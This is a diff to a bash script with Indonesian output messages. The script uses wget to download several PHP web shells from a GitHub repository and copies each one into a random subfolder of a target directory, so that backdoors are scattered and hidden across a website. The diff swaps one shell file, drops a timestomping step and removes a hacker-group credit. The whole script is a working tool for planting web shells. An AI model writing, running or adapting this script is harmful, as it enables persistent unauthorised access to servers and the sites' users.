@@ -33,7 +33,7 @@ sleep 3
 mkdir x
 
 echo -e "\e[32mMengunduh shell ke dalam folder 'x'...\e[0m"
-wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/lph.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/xf.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/us.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/hd.php
 
@@ -42,9 +42,7 @@ for file in x/*.php; do
     random_folder=$(find "$target_folder" -type d | shuf -n 1)
     cp "$file" "$random_folder/$(basename "$file")"
     echo -e "\e[32mShell berhasil disalin ke: $random_folder/$(basename "$file")\e[0m"
-    echo -e "\e[32mMengubah tanggal yang bisa di ubah.\e[0m"
-    find . -exec touch -m -d '01/01/1337' {} +
 done
 rm -rf x
 
-echo -e "\e[32mCoded By HaxorWorld\e[0m"
+echo -e "\e[32mSelesai.\e[0m"
